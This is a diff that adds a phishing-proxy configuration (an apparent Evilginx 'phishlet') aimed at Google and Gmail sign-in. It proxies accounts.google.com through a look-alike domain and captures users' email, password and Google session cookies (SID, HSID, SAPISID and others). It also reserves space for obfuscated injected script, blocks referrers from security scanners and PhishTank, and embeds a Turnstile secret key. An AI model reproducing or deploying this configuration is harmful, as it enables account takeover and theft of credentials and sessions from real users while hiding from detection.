@@ -1,0 +1,38 @@
+name: "enhanced_google_gmail"
+author: "KaliGPT"
+min_ver: "3.3.0"
+redirect_url: "https://mail.google.com"
+
+proxy_hosts:
+  - {phish_sub: "accounts", orig_sub: "accounts", domain: "google.com", session: true, is_landing: true}
+  - {phish_sub: "mail", orig_sub: "mail", domain: "google.com", session: false}
+
+sub_filters:
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com",
+     search: "https://accounts.google.com", replace: "https://accounts.phish.example.com"}
+
+auth_tokens:
+  - domain: ".google.com"
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "SIDCC"]
+
+credentials:
+  username:
+    key: "Email"
+    search: 'input[type="email"]'
+  password:
+    key: "Passwd"
+    search: 'input[type="password"]'
+
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    script: |
+      // Placeholder - replace using inject_obfuscated_js.sh
+
+force_post: "/signin/v2/challenge/pwd"
+
+turnstile:
+  site_key: "0x4AAAAAABhEzR8yC8Mm_M4Z"
+  secret_key: "0x4AAAAAABhEzT6HAnrluK-J8ig6ImOYtgY"
+
+referrer_block:
+  blocked_patterns: ["facebook", "outlook", "security", "phishtank"]
